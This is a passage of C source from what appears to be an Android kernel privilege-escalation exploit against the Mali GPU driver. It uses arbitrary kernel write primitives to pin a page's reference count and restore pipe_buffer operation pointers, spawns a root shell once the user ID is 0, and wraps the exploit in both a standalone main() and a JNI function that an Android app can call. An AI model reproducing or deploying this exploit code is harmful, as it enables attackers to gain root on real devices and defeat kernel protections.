                        __u32 refcount = (__u32)kread64(kaddr + 0x34); // page->_refcount
                        do_print("page refcount 0x%x \n",refcount);
#else
                        __u32 refcount = 20;
#endif
                        refcount++;
                        /* prevent the page from being released */
                        kernel_write(kaddr + 0x34,(__u8 *)&refcount,4);

                        kernel_write(area + 0x10 , (__u8 *)&prw.anon_pipe_buf_ops, 8);
                        kernel_write(area + 0x10 + 0x4000 , (__u8 *)&prw.anon_pipe_buf_ops, 8);

                        //do_print("Found the first pipe_buffer address 0x%llx (0x%x) \n",area,fake_len);
                        cleanup_ok = 1;
                        break;
                }
        }

        close(ta->streamfd);
        do_print("[+] Cleanup  ... %s \n",cleanup_ok ? "OK" : "FAIL");
        if(getuid() == 0) {
                system("/system/bin/sh");
        }


        return 0;
}


#ifdef USE_STANDALONE
int main()
{
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);
        return mali_exploit();
}



#else
extern "C" JNIEXPORT jstring JNICALL
Java_com_example_myapplication_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {

        mali_exploit();
        return NULL;
}
#endif
